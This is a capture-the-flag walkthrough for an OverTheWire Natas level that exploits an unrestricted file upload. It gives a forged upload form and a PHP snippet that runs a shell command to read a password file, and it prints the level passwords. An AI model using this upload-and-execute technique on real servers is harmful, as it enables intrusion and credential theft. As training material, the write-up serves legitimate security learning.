# [Level 11 to 12](https://overthewire.org/wargames/natas/natas12.html) - Exploit file upload

- Login
```
URL: http://natas12.natas.labs.overthewire.org
Username: natas12
Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```
- Exercise:
![image](https://github.com/user-attachments/assets/bc198088-c94a-4f8c-9bc0-617bda87fc74)
![image](https://github.com/user-attachments/assets/b98e4e20-afb9-40de-93e8-8192a2cad313)

- Background:
- Solution:
  - Save the following as file `natas12_form.html`: 
  ```html
  <html>
  <form enctype="multipart/form-data" action="http://natas12.natas.labs.overthewire.org/index.php" method="POST">
  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
  <input type="hidden" name="filename" value="natas12_getpass.php" />
  Choose a JPEG to upload (max 1KB):<br/>
  <input name="uploadedfile" type="file" /><br />
  <input type="submit" value="Upload File" />
  </form>
  </body>
  </html>
  ```
    - Submits a file upload request to the webserver's upload handler `index.php`
    - Telling the server to save the uploaded file as `natas12_getpass.php`
  - Save the following as file `natas12_getpass.php` and load it into `natas12_form.html`:
  ```php
  <?php
  system("cat /etc/natas_webpass/natas13")
  ?>
  ```
    - PHP script that reads the contents of the password file for natas13
    - When this file is executed by the server, the password will be printed on the webpage
  - Open `natas12_form.html` in a browser and upload `natas12_getpass.php`
  - Server saves the file to a location like: `http://natas12.natas.labs.overthewire.org/upload/natas12_getpass.php`
  - Visit that URL in the browser
  - Server executes the PHP file and prints the password for natas13
  ![image](https://github.com/user-attachments/assets/8bf24710-50dd-4eff-bf94-b84b81aa890d)
  ![image](https://github.com/user-attachments/assets/40f6d645-2567-4c56-86a2-76a2f2465d93)
  ![image](https://github.com/user-attachments/assets/f8d0abd9-b252-44be-b4b9-aac9f27389a0)

- Password: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`
